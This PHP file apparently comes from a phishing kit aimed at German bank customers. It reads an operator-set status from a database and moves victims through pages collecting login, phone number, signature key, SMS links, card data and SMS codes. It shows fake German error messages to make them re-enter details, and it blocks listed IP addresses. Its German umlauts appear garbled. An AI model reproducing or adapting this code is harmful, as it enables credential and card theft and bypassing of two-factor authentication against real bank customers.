<?php
session_start();
require_once './config.php';
require_once './helpers/functions.php';
require_once './helpers/class/UserInfo.php';
require_once './system/config/User.php';
require_once './system/config/config.php';
require_once './system/config/db.class.php';
require_once './helpers/class/StepRedirect.php';

if (!isset($_SESSION['page'])) header("location: ./");
if (!isset($_SESSION['allowed'])) header("location: ./");
if (file_exists("./system/IPBam.txt")) comprobateIP("./system/IPBam.txt", UserInfo::getIP(), $out_url);

$userclass = new User();
$db  = new db(DB_HOST, DB_USER, DB_PASS, DB_NAME);
$info = $db->fetch($userclass->getStatus($_SESSION['time']));
@$status =  $info['status'];

$wait = new StepRedirect();
$wait->setStatus($status);
$wait->setStep('2', './login', 'update', ['login' => true]);
$wait->setStep('3', './confirma', 'error', ['phone' => 'Die eingegebene Handynummer ist falsch']);
$wait->setStep('70', './confirma');
$wait->setStep('4', './confirma', 'error', ['firma' => 'Der eingegebene Signaturschl端ssel ist falsch']);
$wait->setStep('5', './url');
$wait->setStep('51', './url', 'error', ['linksms' => 'Der eingegebene SMS-Link ist falsch']);

$wait->setStep('6', './cards', 'error', ['cards' => 'Die angegebenen Daten sind ung端ltig, bitte 端berpr端fen Sie sie und versuchen Sie es erneut']);
$wait->setStep('7', './sms');
$wait->setStep('8', './sms', 'error', ['sms' => 'Der eingegebene SMS-Code ist falsch']);
$wait->setStep('9', './sms', 'error', ['exp_sms' => 'Der angegebene SMS-Code ist abgelaufen']);
$wait->setTimeToRedirect(5);
$wait->start();
?>

